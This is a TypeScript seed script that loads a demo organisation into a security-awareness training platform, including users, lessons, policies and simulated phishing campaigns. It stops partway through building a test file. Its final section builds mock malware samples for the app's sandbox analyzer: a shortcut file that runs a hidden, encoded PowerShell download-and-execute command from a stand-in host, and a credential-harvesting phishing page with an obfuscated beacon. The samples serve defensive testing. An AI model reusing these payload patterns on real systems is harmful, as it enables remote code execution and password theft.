/**
 * Demo data: one organisation with a month of realistic history, produced through the same
 * services the app uses (XP, progress, attestations, certificates, risk). Safe to re-run: it
 * clears the database first. Never run against production.
 *
 *   npm run db:seed            (after npm run db:migrate)
 *
 * Demo sign-in: the role accounts in scripts/seed-data.ts with the password in SEED_PASSWORD
 * (see .env.example).
 */
import fs from "node:fs";
import path from "node:path";
import { getTableName, is, sql } from "drizzle-orm";
import { createTranslator } from "next-intl";
import { PgTable } from "drizzle-orm/pg-core";
import { createDb, type DB } from "../src/server/db/client";
import * as t from "../src/server/db/schema";
import { syncLibrary, syncPaths } from "../src/server/services/library";
import { attestModule, awardXp, completeLesson, issueCertificate, randomToken } from "../src/server/services/progress";
import { recomputeRisk, tenantKpis } from "../src/server/services/risk";
import { audit } from "../src/server/services/audit";
import { hashPassword } from "../src/server/auth/password";
import { analyzeFile, analyzeUrl } from "../src/server/sandbox/analyze";
import { TEMPLATE_BY_KEY, clickRiskTitle } from "../src/lib/campaigns/templates";
import { pick, type Locale } from "../src/i18n/config";
import { messagesFor } from "../src/i18n/translator";
import { DEFAULT_ATTESTATION, DEFAULT_TEMPLATES, defaultSettings } from "../src/lib/tenant-defaults";
import { departmentKey } from "../src/lib/departments";
import { encodeRiskTitle, riskTitle } from "../src/lib/risk-title";
import { REPORT_BONUS_XP, LAB_XP, dayKey } from "../src/lib/domain/gamification";
import { DEMO_DOMAIN, DEPARTMENTS, PEOPLE, PUBLISHED_SEED_PASSWORD, emailFor, mulberry32, seedPasswordProblem, type DeptKey, type SeedPerson } from "./seed-data";

// The seed TRUNCATES EVERY TABLE. Only the local embedded database is seeded without asking: any
// DATABASE_URL (a real PostgreSQL, wherever NODE_ENV points) needs an explicit ALLOW_SEED=1.
if ((process.env.DATABASE_URL || process.env.NODE_ENV === "production") && process.env.ALLOW_SEED !== "1") {
  console.error(
    "Refusing to seed: it deletes every row of the target database and loads the demo organisation.\n" +
      "DATABASE_URL (or NODE_ENV=production) is set. Set ALLOW_SEED=1 only for a fresh or throwaway database.",
  );
  process.exit(1);
}
// The published demo password would open every seeded account, the platform operator included.
const passwordProblem = seedPasswordProblem(process.env);
if (passwordProblem) {
  console.error(`Refusing to seed: ${passwordProblem}`);
  process.exit(1);
}

/** Host and database name of DATABASE_URL, never the credentials. */
function seedTarget(): string {
  const url = process.env.DATABASE_URL;
  if (!url) return "embedded database (.data/pg)";
  try {
    const u = new URL(url);
    return `postgres ${u.hostname}${u.port ? `:${u.port}` : ""}${u.pathname}`;
  } catch {
    return "postgres (DATABASE_URL)";
  }
}

/** Demo password for every seeded account. Override with SEED_PASSWORD (required beyond the local embedded database). */
const SEED_PASSWORD = process.env.SEED_PASSWORD ?? PUBLISHED_SEED_PASSWORD;
const rnd = mulberry32(20261018);
const NOW = new Date();
const DAY = 86_400_000;
const daysAgo = (d: number, hour = 10, minute = 0) => {
  const x = new Date(NOW.getTime() - d * DAY);
  x.setHours(hour, minute, Math.floor(rnd() * 59), 0);
  return x > NOW ? new Date(NOW.getTime() - 60_000) : x;
};
const iso = (d: Date) => d.toISOString().slice(0, 10);
const pickOne = <T,>(arr: T[]): T => arr[Math.floor(rnd() * arr.length)];

async function truncateAll(db: DB) {
  const names = (Object.values(t) as unknown[]).filter((v) => is(v, PgTable)).map((tbl) => `"${getTableName(tbl as PgTable)}"`);
  await db.execute(sql.raw(`TRUNCATE TABLE ${names.join(", ")} RESTART IDENTITY CASCADE`));
}

type Lesson = { id: string; moduleId: string; key: string; position: number; scenes: Array<Record<string, unknown>> };
type Mod = { id: string; slug: string; category: string; xp: number; lessons: Lesson[] };

async function main() {
  const { db, close, driver } = createDb();
  console.log(`Seeding (${driver}) ${seedTarget()}: every table is emptied first…`);
  await truncateAll(db);

  const lib = await syncLibrary(db);
  const pathCount = await syncPaths(db);
  console.log(`Library: ${lib.modules} modules, ${lib.lessons} lessons (texts: ${Object.entries(lib.locales).map(([l, n]) => `${l} ${n}`).join(", ")}), ${pathCount} paths`);

  /* ───────── modules & lessons in memory ───────── */
  const modRows = await db.select().from(t.modules);
  const lessonRows = await db
    .select({ id: t.lessons.id, moduleId: t.lessons.moduleId, key: t.lessons.key, position: t.lessons.position, scenes: t.lessonContents.scenes })
    .from(t.lessons)
    .innerJoin(t.lessonContents, sql`${t.lessonContents.lessonId} = ${t.lessons.id} and ${t.lessonContents.locale} = 'en'`);
  const mods = new Map<string, Mod>();
  for (const m of modRows) mods.set(m.slug, { id: m.id, slug: m.slug, category: m.category, xp: m.xp, lessons: [] });
  const modById = new Map([...mods.values()].map((m) => [m.id, m]));
  for (const l of lessonRows) modById.get(l.moduleId)!.lessons.push({ ...l, scenes: l.scenes as Array<Record<string, unknown>> });
  for (const m of mods.values()) m.lessons.sort((a, b) => a.position - b.position);
  const mod = (slug: string) => {
    const m = mods.get(slug);
    if (!m) throw new Error(`Unknown module ${slug}`);
    return m;
  };
  const paths = await db.select().from(t.learningPaths);
  const pathByKey = new Map(paths.map((p) => [p.key, p]));

  /* ───────── platform operator ───────── */
  const [platform] = await db
    .insert(t.tenants)
    .values({ slug: "platform", name: "Cyclowareness Platform", plan: "enterprise_hrm", branding: { primary: "#4f46e5", accent: "#ff7a1a" }, settings: defaultSettings("az") })
    .returning();
  await db.insert(t.users).values({
    tenantId: platform.id,
    email: "operator@cyclowareness.com",
    name: "Platform Operator",
    role: "super_admin",
    passwordHash: await hashPassword(SEED_PASSWORD),
    locale: "az",
    createdAt: daysAgo(120),
  });

  /* ───────── demo organisation ───────── */
  // The organisation's wordmark (transparent PNG); without the file the demo tenant shows its initial.
  const logoCandidates = ["safarov-industries-wordmark.png"];
  const logoName = logoCandidates.find((f) => fs.existsSync(path.join(process.cwd(), "public", "brand", f)));
  const settings = defaultSettings("az");
  settings.email = { enabled: false, helpdesk: `helpdesk@${DEMO_DOMAIN}` };
  // The fictional demo organisation only: its role accounts open the console with the shared demo password, no authenticator.
  // Real organisations get the default (required); the platform operator above always needs it.
  settings.identity.requireAdmin2fa = false;
  settings.setupSkipped = [];
  const [tenant] = await db
    .insert(t.tenants)
    .values({
      slug: "safarov",
      name: "Safarov Industries",
      plan: "enterprise_hrm",
      branding: { primary: "#4f46e5", accent: "#ff7a1a", logoUrl: logoName ? `/brand/${logoName}` : null, senderName: "Safarov Industries", senderDomain: DEMO_DOMAIN },
      settings,
      domain: DEMO_DOMAIN,
      domainVerifiedAt: daysAgo(4),
      // The fictional demo organisation only: live drills play synthetic responses (operator feature, docs/DEMO.md).
      features: { live_drill: true },
      createdAt: daysAgo(60),
    })
    .returning();
  const tenantId = tenant.id;

  const deptIds = new Map<DeptKey, string>();
  for (const d of DEPARTMENTS) {
    const [row] = await db
      .insert(t.departments)
      .values({ tenantId, name: d.name, nameKey: departmentKey(d.name), parentId: d.parent ? deptIds.get(d.parent)! : null, createdAt: daysAgo(58) })
      .returning();
    deptIds.set(d.key, row.id);
  }

  type Person = SeedPerson & { id: string; email: string; createdAt: Date };
  const people: Person[] = [];
  for (const p of PEOPLE) {
    const createdAt = daysAgo(p.joinedDaysAgo ?? 45 + Math.floor(rnd() * 5), 9);
    const email = emailFor(p);
    const [row] = await db
      .insert(t.users)
      .values({
        tenantId,
        email,
        phone: p.phone ?? null,
        name: p.name,
        jobTitle: p.title,
        role: p.role,
        status: p.status ?? "active",
        departmentId: deptIds.get(p.dept)!,
        locale: p.locale ?? "az",
        passwordHash: p.status === "invited" ? null : await hashPassword(SEED_PASSWORD),
        tourDone: true,
        createdAt,
      })
      .returning({ id: t.users.id });
    people.push({ ...p, id: row.id, email, createdAt });
  }
  const byEmailKey = (key: string) => {
    const found = people.find((p) => p.email.startsWith(`${key}@`) || p.email.startsWith(`${key}.`));
    if (!found) throw new Error(`No seed person for ${key}`);
    return found;
  };
  const admin = byEmailKey("admin");
  const analyst = byEmailKey("analyst");
  const campaignsMgr = byEmailKey("campaigns");
  const content = byEmailKey("content");
  for (const p of people.filter((x) => x.head)) {
    await db.update(t.departments).set({ headUserId: p.id }).where(sql`${t.departments.id} = ${deptIds.get(p.dept)!}`);
  }
  for (const p of people) {
    const head = people.find((h) => h.head && h.dept === p.dept && h.id !== p.id);
    if (head) await db.update(t.users).set({ managerId: head.id }).where(sql`${t.users.id} = ${p.id}`);
  }
  const active = people.filter((p) => (p.status ?? "active") === "active");
  console.log(`People: ${people.length}`);

  /* ───────── assignments ───────── */
  const assignedAt = daysAgo(40, 11);
  const assignmentValues: (typeof t.assignments.$inferInsert)[] = [
    { tenantId, moduleId: mod("phishing-email").id, scope: "everyone", dueKind: "none", createdBy: admin.id, createdAt: assignedAt },
    { tenantId, moduleId: mod("passwords-mfa").id, scope: "everyone", dueKind: "fixed", dueDate: iso(new Date(NOW.getTime() + 12 * DAY)), createdBy: admin.id, createdAt: assignedAt },
    { tenantId, pathId: pathByKey.get("core")!.id, scope: "everyone", dueKind: "after_joining", dueDays: 45, createdBy: admin.id, createdAt: daysAgo(38) },
    { tenantId, pathId: pathByKey.get("finance-bec")!.id, scope: "department", departmentId: deptIds.get("fin")!, dueKind: "fixed", dueDate: iso(new Date(NOW.getTime() + 20 * DAY)), createdBy: admin.id, createdAt: daysAgo(30) },
    { tenantId, pathId: pathByKey.get("technical")!.id, scope: "department", departmentId: deptIds.get("it")!, dueKind: "none", createdBy: admin.id, createdAt: daysAgo(30) },
    { tenantId, pathId: pathByKey.get("leaders")!.id, scope: "department", departmentId: deptIds.get("exec")!, dueKind: "none", createdBy: admin.id, createdAt: daysAgo(29) },
    { tenantId, pathId: pathByKey.get("new-hire")!.id, scope: "user", userId: byEmailKey("konul").id, dueKind: "after_joining", dueDays: 30, createdBy: admin.id, createdAt: daysAgo(11) },
  ];
  await db.insert(t.assignments).values(assignmentValues);

  /* ───────── learning history ───────── */
  const corePath = pathByKey.get("core")!.moduleSlugs;
  const deptPath: Partial<Record<DeptKey, string[]>> = {
    fin: pathByKey.get("finance-bec")!.moduleSlugs,
    it: pathByKey.get("technical")!.moduleSlugs,
    sec: pathByKey.get("technical")!.moduleSlugs,
    exec: pathByKey.get("leaders")!.moduleSlugs,
  };
  const voluntary = ["quishing", "mobile-wifi", "deepfake-scams", "usb-media", "social-media", "clicked-now-what", "ai-tools-safety", "fake-captcha-commands", "messenger-hijack", "sim-swap-otp"];

  type Ev = { at: Date; run: () => Promise<void> };
  const timeline: Ev[] = [];

  function answersFor(p: Person, lesson: Lesson, category: string, at: Date) {
    const rows: (typeof t.answers.$inferInsert)[] = [];
    for (const scene of lesson.scenes) {
      const sceneId = String(scene.id);
      const type = scene.type as string;
      const ok = () => rnd() < Math.min(0.97, p.skill + 0.08);
      if (type === "choice") {
        const correct = ok();
        rows.push({ tenantId, userId: p.id, lessonId: lesson.id, sceneId, correct, firstTry: true, category, at });
        if (!correct) rows.push({ tenantId, userId: p.id, lessonId: lesson.id, sceneId, correct: true, firstTry: false, category, at });
      } else if (["hotspot", "swipe", "match", "order", "password"].includes(type)) {
        rows.push({ tenantId, userId: p.id, lessonId: lesson.id, sceneId, correct: ok(), firstTry: true, category, at });
      } else if (type === "simulation") {
        for (const step of (scene.steps as Array<{ id: string }>) ?? []) {
          const safe = ok();
          rows.push({
            tenantId,
            userId: p.id,
            lessonId: lesson.id,
            sceneId,
            itemId: step.id,
            correct: safe,
            firstTry: true,
            outcome: safe ? "safe" : rnd() < 0.6 ? "risky" : "compromised",
            category,
            at,
          });
        }
      } else if (type === "scenario") {
        const safe = ok();
        rows.push({ tenantId, userId: p.id, lessonId: lesson.id, sceneId, correct: safe, firstTry: true, outcome: safe ? "safe" : "risky", category, at });
      }
    }
    return rows;
  }

  const attestText = DEFAULT_ATTESTATION.az;
  for (const p of active) {
    if (p.activity <= 0) continue;
    const plan = [...new Set(["phishing-email", "passwords-mfa", ...corePath, ...(deptPath[p.dept] ?? []), ...voluntary.filter(() => rnd() < p.activity * 0.25)])];
    const span = Math.min(40, (NOW.getTime() - p.createdAt.getTime()) / DAY - 1);
    // Recent learners keep a live streak; others learned in bursts.
    const streakDays = p.activity > 0.75 ? 2 + Math.floor(rnd() * 8) : p.activity > 0.5 && rnd() < 0.5 ? 1 + Math.floor(rnd() * 3) : 0;
    let cursor = span;
    const lessonsBudget = Math.round(plan.reduce((s, slug) => s + mod(slug).lessons.length, 0) * Math.min(1, p.activity * 1.05));
    let used = 0;
    outer: for (const slug of plan) {
      const m = mod(slug);
      for (const lesson of m.lessons) {
        if (used >= lessonsBudget) break outer;
        used++;
        const remaining = lessonsBudget - used;
        const day = remaining < streakDays ? remaining : Math.max(streakDays + 1, cursor - rnd() * 3);
        cursor = Math.max(streakDays + 1, cursor - 0.4 - rnd() * 2.2);
        const at = daysAgo(day, 9 + Math.floor(rnd() * 8), Math.floor(rnd() * 59));
        const isLast = lesson.position === m.lessons.length - 1;
        timeline.push({
          at,
          run: async () => {
            await db.insert(t.answers).values(answersFor(p, lesson, m.category, at));
            const res = await completeLesson(db, { tenantId, userId: p.id, lessonId: lesson.id, secondsSpent: 150 + Math.floor(rnd() * 140), at });
            if (isLast && res.moduleStatus === "awaiting_attestation" && rnd() < 0.82) {
              await attestModule(db, { tenantId, userId: p.id, moduleId: m.id, text: attestText, locale: p.locale ?? "az", at: new Date(at.getTime() + 90_000) });
            }
          },
        });
      }
    }
    // Practice lab.
    for (const [game, xp] of Object.entries(LAB_XP)) {
      if (rnd() > p.activity * 0.8) continue;
      const at = daysAgo(Math.floor(rnd() * span), 13, 15);
      const max = game === "password-forge" ? 1 : game === "mfa-fatigue" ? 3 : 5;
      const score = Math.max(0, Math.min(max, Math.round(max * (p.skill + (rnd() - 0.5) * 0.3))));
      timeline.push({
        at,
        run: async () => {
          await db.insert(t.labAttempts).values({ tenantId, userId: p.id, exercise: game, score, max, xp: Math.round((xp * score) / max), at });
          if (score > 0) await awardXp(db, { tenantId, userId: p.id, amount: Math.round((xp * score) / max), reason: "lab", ref: game, at });
        },
      });
    }
  }
  timeline.sort((a, b) => a.at.getTime() - b.at.getTime());
  for (const ev of timeline) await ev.run();
  console.log(`History events: ${timeline.length}`);

  /* ───────── policies ───────── */
  const aupEn = fs.readFileSync(path.join(process.cwd(), "content", "policies", "acceptable-use.en.md"), "utf8").replace(/^<!--[\s\S]*?-->\s*/, "");
  const aupAzFile = path.join(process.cwd(), "content", "policies", "acceptable-use.az.md");
  const aupAz = fs.existsSync(aupAzFile) ? fs.readFileSync(aupAzFile, "utf8").replace(/^<!--[\s\S]*?-->\s*/, "") : null;
  const pwAz = fs.readFileSync(path.join(process.cwd(), "content", "policies", "passwords.az.md"), "utf8");
  const pwEn = fs.readFileSync(path.join(process.cwd(), "content", "policies", "passwords.en.md"), "utf8");
  // Other languages come from content/policies/<name>.<locale>.md; a language without its file (a translation still
  // being written) is skipped, and its readers see the base text with a notice.
  const policyTranslations = (name: string, texts: Record<Exclude<Locale, "az" | "en">, { title: string; summary: string }>): Record<string, { title: string; summary: string; bodyMd: string }> =>
    Object.fromEntries(
      Object.entries(texts).flatMap(([locale, text]) => {
        const file = path.join(process.cwd(), "content", "policies", `${name}.${locale}.md`);
        return fs.existsSync(file) ? [[locale, { ...text, bodyMd: fs.readFileSync(file, "utf8").replace(/^<!--[\s\S]*?-->\s*/, "") }]] : [];
      }),
    );
  const policySpecs = [
    {
      title: "İnformasiya resurslarından məqbul istifadə siyasəti",
      created: daysAgo(16),
      body: aupAz ?? aupEn,
      summary: "Hesablar, e-poçt, internet, cihazlar, məlumat və Sİ xidmətlərindən təhlükəsiz və qanuni istifadə qaydaları.",
      translations: {
        en: { title: "Acceptable Use of Information Resources Policy", summary: "Rules for the secure and lawful use of accounts, email, internet, devices, data and AI services.", bodyMd: aupEn },
        ...policyTranslations("acceptable-use", {
          ru: { title: "Политика допустимого использования информационных ресурсов", summary: "Правила безопасного и законного использования учётных записей, электронной почты, интернета, устройств, данных и сервисов ИИ." },
          tr: { title: "Bilgi kaynaklarının kabul edilebilir kullanımı politikası", summary: "Hesapların, e-postanın, internetin, cihazların, verilerin ve yapay zekâ hizmetlerinin güvenli ve hukuka uygun kullanımına ilişkin kurallar." },
          ro: { title: "Politica de utilizare acceptabilă a resurselor informaționale", summary: "Reguli pentru utilizarea sigură și legală a conturilor, a e-mailului, a internetului, a dispozitivelor, a datelor și a serviciilor AI." },
          ka: { title: "ინფორმაციული რესურსების მისაღები გამოყენების პოლიტიკა", summary: "ანგარიშების, ელფოსტის, ინტერნეტის, მოწყობილობების, მონაცემებისა და ხელოვნური ინტელექტის სერვისების უსაფრთხო და კანონიერი გამოყენების წესები." },
          uk: { title: "Політика прийнятного використання інформаційних ресурсів", summary: "Правила безпечного й законного використання облікових записів, електронної пошти, інтернету, пристроїв, даних і сервісів ШІ." },
          de: { title: "Richtlinie zur zulässigen Nutzung von Informationsressourcen", summary: "Regeln für die sichere und rechtmäßige Nutzung von Konten, E-Mail, Internet, Geräten, Daten und KI-Diensten." },
          fr: { title: "Politique d’utilisation acceptable des ressources informationnelles", summary: "Règles d’utilisation sûre et licite des comptes, de la messagerie électronique, d’internet, des appareils, des données et des services d’IA." },
          ar: { title: "سياسة الاستخدام المقبول لموارد المعلومات", summary: "قواعد الاستخدام الآمن والمشروع للحسابات والبريد الإلكتروني والإنترنت والأجهزة والبيانات وخدمات الذكاء الاصطناعي." },
        }),
      },
      signRate: 0.55,
    },
    {
      title: "Parol və hesab təhlükəsizliyi siyasəti",
      created: daysAgo(6),
      body: pwAz,
      summary: "Parollar, iki addımlı doğrulama və parol meneceri qaydaları.",
      translations: {
        en: { title: "Password and Account Security Policy", summary: "Rules for passwords, two-step verification and the password manager.", bodyMd: pwEn },
        ...policyTranslations("passwords", {
          ru: { title: "Политика паролей и безопасности учётных записей", summary: "Правила для паролей, двухэтапной проверки и менеджера паролей." },
          tr: { title: "Parola ve hesap güvenliği politikası", summary: "Parolalara, iki adımlı doğrulamaya ve parola yöneticisine ilişkin kurallar." },
          ro: { title: "Politica privind parolele și securitatea conturilor", summary: "Reguli privind parolele, verificarea în doi pași și managerul de parole." },
          ka: { title: "პაროლებისა და ანგარიშების უსაფრთხოების პოლიტიკა", summary: "პაროლების, ორსაფეხურიანი დადასტურებისა და პაროლების მენეჯერის გამოყენების წესები." },
          uk: { title: "Політика щодо паролів і безпеки облікових записів", summary: "Правила щодо паролів, двоетапної перевірки та менеджера паролів." },
          de: { title: "Richtlinie zu Passwörtern und Kontosicherheit", summary: "Regeln für Passwörter, die Zwei-Faktor-Authentisierung und den Passwort-Manager." },
          fr: { title: "Politique relative aux mots de passe et à la sécurité des comptes", summary: "Règles relatives aux mots de passe, à la double authentification et au gestionnaire de mots de passe." },
          ar: { title: "سياسة كلمات المرور وأمن الحسابات", summary: "قواعد كلمات المرور والتحقق بخطوتين ومدير كلمات المرور." },
        }),
      },
      signRate: 0.3,
    },
  ];
  for (const spec of policySpecs) {
    const [pol] = await db.insert(t.policies).values({ tenantId, title: spec.title, createdBy: admin.id, createdAt: spec.created }).returning();
    const [ver] = await db
      .insert(t.policyVersions)
      .values({ policyId: pol.id, version: 1, title: spec.title, summary: spec.summary, bodyMd: spec.body, translations: spec.translations, publishedAt: spec.created, createdAt: spec.created })
      .returning();
    await audit(db, { tenantId, actorId: admin.id, action: "policy.created", targetType: "policy", targetId: pol.id, meta: { title: spec.title }, at: spec.created });
    await audit(db, { tenantId, actorId: admin.id, action: "policy.version_published", targetType: "policy", targetId: pol.id, meta: { version: 1 }, at: spec.created });
    for (const p of active) {
      if (p.id === admin.id || rnd() > spec.signRate * (0.5 + p.activity)) continue;
      const at = new Date(spec.created.getTime() + rnd() * (NOW.getTime() - spec.created.getTime()));
      await db.insert(t.policySignoffs).values({ versionId: ver.id, userId: p.id, signedAt: at, ip: "10.20.4." + Math.floor(rnd() * 200) });
    }
  }

  /* ───────── phishing campaigns ───────── */
  const campaignSpecs = [
    { name: "Sentyabr maaş vərəqəsi simulyasiyası", template: "payslip", audience: "all" as const, launched: 38, status: "completed" as const },
    { name: "Maliyyə şöbəsi: bank rekvizitləri dəyişikliyi", template: "bank-details", audience: "department" as const, dept: "fin" as DeptKey, launched: 26, status: "completed" as const },
    { name: "Yay kuryer SMS kampaniyası", template: "parcel-sms", audience: "all" as const, launched: 20, status: "completed" as const },
    { name: "HR maaş portalı (L-2041)", template: "mfa-qr", audience: "all" as const, launched: 4, status: "running" as const },
    { name: "Rəhbərlər üçün konfrans dəvəti", template: "keynote", audience: "department" as const, dept: "exec" as DeptKey, status: "draft" as const },
    { name: "Kuryer bağlaması və USB testi", template: "usb-parcel", audience: "all" as const, status: "scheduled" as const, scheduledIn: 6 },
  ];
  let reportNumber = 140;
  const clickRisks: { userId: string; moduleId: string; at: Date; title: string; severity: "medium" | "high"; ref: string }[] = [];
  for (const c of campaignSpecs) {
    const tpl = TEMPLATE_BY_KEY.get(c.template)!;
    const launchedAt = c.launched !== undefined ? daysAgo(c.launched, 10, 30) : null;
    const scheduledAt = c.scheduledIn ? new Date(NOW.getTime() + c.scheduledIn * DAY) : launchedAt;
    const [camp] = await db
      .insert(t.campaigns)
      .values({
        tenantId,
        name: c.name,
        channel: tpl.channel,
        templateKey: tpl.key,
        audience: c.audience,
        departmentId: c.dept ? deptIds.get(c.dept)! : null,
        status: c.status,
        scheduledAt,
        launchedAt,
        completedAt: c.status === "completed" && launchedAt ? new Date(launchedAt.getTime() + 7 * DAY) : null,
        createdBy: campaignsMgr.id,
        createdAt: launchedAt ? new Date(launchedAt.getTime() - 2 * DAY) : daysAgo(2),
      })
      .returning();
    await audit(db, { tenantId, actorId: campaignsMgr.id, action: "campaign.created", targetType: "campaign", targetId: camp.id, meta: { name: c.name }, at: camp.createdAt });
    if (!launchedAt) continue;
    await audit(db, { tenantId, actorId: campaignsMgr.id, action: "campaign.launched", targetType: "campaign", targetId: camp.id, meta: { name: c.name }, at: launchedAt });
    const audience = active.filter((p) => c.audience === "all" || p.dept === c.dept || (c.dept === "it" && p.dept === "sec"));
    const clickBase = tpl.difficulty === "Easy" ? 0.3 : tpl.difficulty === "Medium" ? 0.38 : 0.5;
    for (const p of audience) {
      const sentAt = new Date(launchedAt.getTime() + rnd() * 3_600_000);
      const opened = rnd() < 0.55 + p.activity * 0.3;
      const openedAt = opened ? new Date(sentAt.getTime() + rnd() * 6 * 3_600_000) : null;
      const clicked = opened && rnd() < clickBase * (1.35 - p.skill);
      const clickedAt = clicked ? new Date(openedAt!.getTime() + rnd() * 600_000) : null;
      const submitted = clicked && tpl.harvest && rnd() < 0.5;
      const submittedAt = submitted ? new Date(clickedAt!.getTime() + 60_000) : null;
      const reported = opened && rnd() < p.skill * 0.5 + (clicked ? -0.15 : 0.1);
      const reportedAt = reported ? new Date(openedAt!.getTime() + rnd() * 3_600_000) : null;
      const [rec] = await db
        .insert(t.campaignRecipients)
        .values({ campaignId: camp.id, userId: p.id, token: randomToken(16), sentAt, openedAt, clickedAt, submittedAt, reportedAt })
        .returning();
      if (reportedAt) {
        await db.insert(t.threatReports).values({
          tenantId,
          number: ++reportNumber,
          reporterId: p.id,
          channel: tpl.channel === "sms" ? "sms" : tpl.channel === "voice" ? "call" : "email",
          subject: tpl.subject.az,
          details: "Simulyasiya — avtomatik uyğunlaşdırıldı.",
          status: "triaged",
          severity: "low",
          campaignRecipientId: rec.id,
          createdAt: reportedAt,
        });
        await awardXp(db, { tenantId, userId: p.id, amount: REPORT_BONUS_XP, reason: "report", ref: rec.id, at: reportedAt });
      }
      if (clickedAt) {
        clickRisks.push({
          userId: p.id,
          moduleId: mod(tpl.moduleSlug).id,
          at: clickedAt,
          title: clickRiskTitle(c.name),
          severity: submitted ? "high" : "medium",
          ref: camp.id,
        });
      }
    }
  }
  for (const r of clickRisks) {
    const [mp] = await db
      .select({ completedAt: t.moduleProgress.completedAt })
      .from(t.moduleProgress)
      .where(sql`${t.moduleProgress.userId} = ${r.userId} and ${t.moduleProgress.moduleId} = ${r.moduleId} and ${t.moduleProgress.status} = 'completed'`);
    const closed = mp?.completedAt && mp.completedAt > r.at;
    await db.insert(t.behaviorRisks).values({
      tenantId,
      userId: r.userId,
      kind: "phishing_click",
      severity: r.severity,
      title: r.title,
      sourceRef: r.ref,
      moduleId: r.moduleId,
      status: closed ? "closed" : "open",
      dueDate: iso(new Date(r.at.getTime() + 14 * DAY)),
      createdAt: r.at,
      closedAt: closed ? mp!.completedAt : null,
    });
  }

  /* ───────── other open risks (breach, path) ───────── */
  const learner = byEmailKey("learner");
  const pwModule = mod("password-managers-work");
  // The quoted module and path names are their titles in content/library (i18n.<locale>.json, paths.json).
  const breachTitle = encodeRiskTitle({
    az: "E-poçt ünvanınız ictimai məlumat sızıntısında aşkarlanıb. Buna görə sizə «İşdə parol menecerləri» təlimi təyin olunub.",
    en: "Your email address was found in a public data breach, so you have been given the “Password managers at work” training.",
    ru: "Ваш адрес электронной почты обнаружен в публичной утечке данных, поэтому вам назначено обучение «Менеджеры паролей на работе».",
    tr: "E-posta adresiniz herkese açık bir veri sızıntısında bulundu. Bu nedenle size “İş yerinde parola yöneticileri” eğitimi atandı.",
    ro: "Adresa dumneavoastră de e-mail a fost găsită într-o scurgere publică de date, de aceea vi s-a atribuit instruirea „Managerul de parole la serviciu”.",
    ka: "თქვენი ელფოსტის მისამართი მონაცემთა საჯარო გაჟონვაში აღმოჩნდა, ამიტომ დაგენიშნათ ტრენინგი „პაროლების მენეჯერები სამსახურში“.",
    uk: "Вашу адресу електронної пошти виявлено в публічному витоку даних, тому вам призначено навчання «Менеджери паролів на роботі».",
    de: "Ihre E-Mail-Adresse wurde in einem öffentlichen Datenleck gefunden, deshalb wurde Ihnen die Schulung „Passwort-Manager bei der Arbeit“ zugewiesen.",
    fr: "Votre adresse e-mail a été trouvée dans une fuite de données publique : la formation « Gestionnaires de mots de passe au travail » vous a donc été assignée.",
    ar: "تم العثور على عنوان بريدك الإلكتروني في تسرب بيانات منشور، لذلك أسند إليك تدريب «مدير كلمات المرور في العمل».",
  } satisfies Record<Locale, string>);
  await db.insert(t.behaviorRisks).values([
    {
      tenantId,
      userId: learner.id,
      kind: "breach",
      severity: "high",
      title: breachTitle,
      sourceRef: "breach-monitor",
      moduleId: pwModule.id,
      dueDate: iso(new Date(NOW.getTime() + 2 * DAY)),
      createdAt: daysAgo(3),
    },
    {
      tenantId,
      userId: learner.id,
      kind: "path",
      severity: "high",
      title: encodeRiskTitle({
        az: "Təlim yolunun bir hissəsidir: «Ödəniş fırıldaqları və BEC-dən müdafiə».",
        en: "Part of the learning path “Payment fraud and BEC defence”.",
        ru: "Входит в учебный путь «Защита от платёжного мошенничества и BEC».",
        tr: "“Ödeme dolandırıcılığına ve BEC'ye karşı korunma” öğrenme yolunun bir parçasıdır.",
        ro: "Face parte din parcursul de învățare „Protecție împotriva fraudelor la plăți și BEC”.",
        ka: "სასწავლო გზის „დაცვა გადახდის თაღლითობისა და BEC-ისგან“ ნაწილია.",
        uk: "Входить до навчального шляху «Захист від платіжного шахрайства та BEC».",
        de: "Teil des Lernpfads „Schutz vor Zahlungsbetrug und BEC“.",
        fr: "Fait partie du parcours de formation « Contrer la fraude aux paiements et le BEC ».",
        ar: "جزء من المسار التدريبي «الحماية من الاحتيال في المدفوعات واختراق بريد الأعمال (BEC)».",
      } satisfies Record<Locale, string>),
      sourceRef: "path:finance-bec",
      moduleId: mod("vendor-email-compromise").id,
      dueDate: iso(new Date(NOW.getTime() + 8 * DAY)),
      createdAt: daysAgo(10),
    },
    {
      tenantId,
      userId: byEmailKey("samir").id,
      kind: "breach",
      severity: "high",
      title: breachTitle,
      sourceRef: "breach-monitor",
      moduleId: pwModule.id,
      dueDate: iso(new Date(NOW.getTime() + 5 * DAY)),
      createdAt: daysAgo(6),
    },
  ]);

  /* ───────── security operations ───────── */
  // Sandbox analyses come from the real analyzer, fed with harmless synthetic samples.
  const lnk = Buffer.concat([
    Buffer.from([0x4c, 0, 0, 0, 0x01, 0x14, 0x02, 0, 0, 0, 0, 0, 0xc0, 0, 0, 0, 0, 0, 0, 0x46]),
    Buffer.from("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA https://cdn-faktura.top/f.ps1", "utf16le"),
  ]);
  const phishHtml = Buffer.from(
    `<!doctype html><html><head><title>Maaş portalı</title><meta http-equiv="refresh" content="300"></head><body><form action="https://maas-portal.info/giris" method="post"><input name="email"><input type="password" name="p"><button>Daxil ol</button></form><script>var k=atob("aHR0cHM6Ly9tYWFzLXBvcnRhbC5pbmZvL2M=");document.write(unescape("%3Cimg%20src%3D%22"+k+"%22%3E"));</script></body></html>`,
  );
  const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0x00, 0x10, 0x4a, 0x46, 0x49, 0x46]), Buffer.alloc(2048, 7)]);
  const docx = (() => {
    // Minimal OOXML package: names only (stored, no compression), enough for the structure checks.
    const files = ["[Content_Types].xml", "word/document.xml", "word/styles.xml", "docProps/core.xml"];
    const parts: Buffer[] = [];
    const central: Buffer[] = [];
    let offset = 0;
    for (const name of files) {
      const body = Buffer.from(name === "word/document.xml" ? "<w:document><w:body><w:p>CV</w:p></w:body></w:document>" : "<x/>");
      const nameBuf = Buffer.from(name);
      const local = Buffer.alloc(30);
      local.writeUInt32LE(0x04034b50, 0);
      local.writeUInt16LE(20, 4);
      local.writeUInt32LE(body.length, 18);
      local.writeUInt32LE(body.length, 22);
      local.writeUInt16LE(nameBuf.length, 26);
      parts.push(local, nameBuf, body);
      const c = Buffer.alloc(46);
      c.writeUInt32LE(0x02014b50, 0);
